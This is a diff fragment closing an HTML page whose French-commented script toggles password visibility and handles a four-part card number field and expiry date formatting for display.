+        ico.innerHTML='<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
+      } else {
+        inp.type='password';
+        ico.innerHTML='<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+      }
+    }
+
+    /* ══════════════════════════════
+       4 CHAMPS NUMÉRO DE CARTE
+    ══════════════════════════════ */
+    const cbFieldIds = ['cbN1','cbN2','cbN3','cbN4'];
+
+    function onCbInput(input, idx) {
+      // Ne garder que les chiffres
+      input.value = input.value.replace(/\D/g, '').substring(0, 4);
+      // Auto-focus champ suivant quand 4 chiffres saisis
+      if (input.value.length === 4 && idx < 4) {
+        document.getElementById('cbN' + (idx + 1)).focus();
+      }
+      updateCbDisplay();
+    }
+
+    function onCbKey(e, idx) {
+      // Backspace sur champ vide → retour au champ précédent
+      if (e.key === 'Backspace' && document.getElementById('cbN' + idx).value === '' && idx > 1) {
+        const prev = document.getElementById('cbN' + (idx - 1));
+        prev.focus();
+        const len = prev.value.length;
+        prev.setSelectionRange(len, len);
+      }
+    }
+
+    function getCbNumber() {
+      return cbFieldIds.map(id => document.getElementById(id).value).join(' ');
+    }
+
+    function updateCbDisplay() {
+      const vals = cbFieldIds.map(id => {
+        const v = document.getElementById(id).value;
+        return v.padEnd(4, '•');
+      });
+      const d = document.getElementById('cbNumberDisplay');
+      if (d) d.innerHTML = vals.join(' &nbsp;');
+    }
+
+    /* ── Format expiration ── */
+    function formatExpiry(input) {
+      let v=input.value.replace(/\D/g,'').substring(0,4);
+      if(v.length>=2) v=v.slice(0,2)+'/'+v.slice(2);
+      input.value=v;
+      const d=document.getElementById('cbExpDisplay');
+      if(d) d.textContent=v||'MM/AA';
+    }
+  </script>
+
+</body>
+</html>
